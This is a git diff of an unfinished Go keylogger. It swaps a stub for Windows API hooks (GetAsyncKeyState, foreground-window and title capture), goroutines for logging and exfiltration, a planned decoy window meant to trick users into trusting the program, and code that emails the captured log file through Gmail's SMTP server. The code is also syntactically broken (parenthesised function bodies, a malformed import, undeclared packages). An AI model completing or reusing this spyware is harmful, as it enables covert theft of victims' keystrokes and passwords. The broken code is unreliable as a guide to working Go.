@@ -1,83 +1,75 @@
 package main
 
-/*
-This is a keylogger in progress that will read keystrokes and email the log.
-need to program the keystroke functionality
-trying to make this a cross-compatabile executable
-*/
 import (
 	"fmt"
-	// "github.com/eiannone/keyboard"
 	"net/smtp"
 	"os"
+	"unsafe"
+	"syscall"
+	"time"
+	"github/TheTitanrain/w32"
 )
 
-func main() {
-	mode_stats := os.Args[0]
-	debug_mode := mode(mode_stats)
-	start(debug_mode)
-	// have to add concurrency to log keystrokes and mail log every
-	key(debug_mode)
-	// mail(debug_mode)
-}
+var (
+	// windows
+	user32 = syscall.NewLazyDll("user32.dll")
+	procGetForegroundWindow = user32.NewProc("GetForegroundWindow") // get the foreground win api
+	procGetWindowTitle = user32.NewProc("GetWindowTextW") // get the process title
+	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
 
-func mode(mode string) bool {
-	var debug_mode bool = false
-	if mode == "-d" {
-		debug_mode = true
-	}
-	return debug_mode
-}
+	tempKeylog string
+	tempTitle string
 
-func start(debug_mode bool) {
-	// get the user to start the program
-}
+	// linux
 
-func key(debug_mode bool) {
-	// log the keystrokes to a file
-}
 
-func mail(debug_mode bool) {
-	// email the log to a email
+)
 
-	// from is senders email address
+func main() (
+	// setup go routines for the program to run
+	go keylogging() // log the keystrokes
+	// these are only going to work on windows for now
+	// log the current forground window and title
+	go GetWindowTitle() 
+	go GetActiveWindow()
+	go exfil() // every time interval need to send the log file and other logged data
+)
 
-	// we used environment variables to load the
-	// email address and the password from the shell
-	// you can also directly assign the email address
-	// and the password
-	from := os.Getenv("MAIL")
-	password := os.Getenv("PASSWD")
+// create a window on startup to trick the user 
+// into thinking its safe software
+func startingWindow() (
 
-	// toList is list of email address that email is to be sent.
-	toList := []string{"example@gmail.com"}
+)
 
-	// host is address of server that the
-	// sender's email address belongs,
-	// in this case its gmail.
-	// For e.g if your are using yahoo
-	// mail change the address as smtp.mail.yahoo.com
-	host := "smtp.gmail.com"
+// get the active foreground
+func GetActiveWindow() (
+	// log the active forground this should be in the same log file as keystrokes
 
-	// default port of smtp server
-	port := "587"
+)
 
-	// This is the message to send in the mail
-	// needs to be set to the log file
-	msg := ""
-	body := []byte(msg)
+// get the window title 
+func GetWindowTitle() (
+	// log the window title on windows
 
-	auth := smtp.PlainAuth("", from, password, host)
+)
 
-	err := smtp.SendMail(host+":"+port, auth, from, toList, body)
+// get keystrokes
+func keylogging() (
+	// need to log the keys based on OS and log to file
 
-	// handling the errors
+)
+
+func exfil() (
+	// need to create a way to exfil data besides keystrokes
+	m := email.NewMessage("venivici")
+	m.From = "from@example.com" // need to convert to env variables if possible
+	m.To = []string{"to@example.com"} // the test email account
+
+	err := m.Attach("notes.txt") // the log file
 	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
+		log.Println(err)
 	}
 
-	if debug_mode == true {
-		fmt.Println("Sent")
-	}
-}
+	// change to email other than google
+	err = email.Send("smtp.gmail.com:587", smtp.PlainAuth("", "user", "password", "smtp.gmail.com"), m)
+)
